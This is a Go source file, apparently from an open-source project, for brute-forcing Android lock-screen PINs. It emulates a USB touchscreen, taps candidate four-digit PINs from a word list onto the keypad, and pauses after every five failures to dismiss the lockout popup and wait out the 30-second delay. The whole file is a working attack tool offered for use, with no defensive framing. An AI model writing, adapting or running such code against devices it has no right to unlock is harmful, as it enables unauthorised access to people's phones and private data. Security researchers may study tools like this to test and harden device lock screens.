package main

import (
	"fmt"
	accessory "github.com/Tryanks/go-accessoryhid"
	"github.com/jeanbritz/go-android-bruteforce-pin.git/pkg/hid"
	"github.com/jeanbritz/go-android-bruteforce-pin.git/pkg/utils"
	"log"
	"time"
)

type Pos struct {
	X int16
	Y int16
}

func main() {

	keyMap := make(map[string]Pos)

	keyMap["0"] = Pos{
		X: 5000,
		Y: 7500,
	}
	keyMap["1"] = Pos{
		X: 2000,
		Y: 4000,
	}
	keyMap["2"] = Pos{
		X: 5000,
		Y: 4000,
	}
	keyMap["3"] = Pos{
		X: 8000,
		Y: 4000,
	}
	keyMap["4"] = Pos{
		X: 2000,
		Y: 5500,
	}
	keyMap["5"] = Pos{
		X: 5000,
		Y: 5500,
	}
	keyMap["6"] = Pos{
		X: 8000,
		Y: 5500,
	}
	keyMap["7"] = Pos{
		X: 2000,
		Y: 6500,
	}
	keyMap["8"] = Pos{
		X: 5000,
		Y: 6500,
	}
	keyMap["9"] = Pos{
		X: 8000,
		Y: 6500,
	}
	keyMap["C"] = Pos{
		X: 8000,
		Y: 7850,
	}
	keyMap["P"] = Pos{
		X: 2000,
		Y: 5500,
	}

	devices, err := accessory.GetDevices(2)
	if err != nil {
		log.Fatalln(err)
	}
	if len(devices) > 0 {
		log.Println("Found Android HID device:" + devices[0].Manufacturer)
	} else {
		log.Println("Did not find any HID device")
	}

	phone := devices[0]
	defer phone.Close()

	touch, err := phone.Register(hid.TouchscreenReportDesc)
	if err != nil {
		log.Fatalln(err)
	}

	touchscreen := hid.Touchscreen{
		Accessory: touch,
	}

	pins, err := utils.ReadLines("pins/pins-4-length.txt")
	if err != nil {
		log.Fatalf("Could not find or load pins file, %s", err)
	}
	pins = utils.Reverse(pins)

	pinStack := utils.Stack{}

	for _, pin := range pins {
		pinStack.Push(pin)
	}

	time.Sleep(2 * time.Second)

	for i := 0; i < len(pins)/5; i++ {

		// Position over item (e.g. Usb debugging) and double tap to get to keypad
		x := 5000
		y := 6000
		touchscreen.SetPosition(int16(x), int16(y))
		log.Println("Apply double tap on screen to show keypad")
		touchscreen.Press()
		touchscreen.Press()

		log.Println("Keypad should show now")

		time.Sleep(2 * time.Second)
		counter := 0
		startTime := time.Now()
		for !pinStack.IsEmpty() {
			pin, _ := pinStack.Pop()
			inputs := fmt.Sprintf("%sC", pin)
			log.Println("Trying pin... " + pin)
			for _, input := range inputs {
				touchscreen.SetPosition(keyMap[string(input)].X, keyMap[string(input)].Y)
				touchscreen.SetPosition(keyMap[string(input)].X, keyMap[string(input)].Y) // Some syncing issue
				time.Sleep(150 * time.Millisecond)
				touchscreen.Press()

			}
			counter++
			time.Sleep(1500 * time.Millisecond)
			if counter%5 == 0 {
				log.Println("5 pins have been entered, probably need to wait for 30 seconds")
				log.Println("Pressing OK to clear popup")
				log.Printf("Need to try %d pins more to complete\n", pinStack.Size())
				touchscreen.SetPosition(keyMap["P"].X, keyMap["P"].Y)
				time.Sleep(250 * time.Millisecond)
				touchscreen.Press()
				break
			}

		}
		endTime := time.Now()
		diff := endTime.Sub(startTime)
		log.Println("Iteration time: " + diff.String())
		if counter%5 == 0 {
			time.Sleep(31 * time.Second)
		}
	}

}
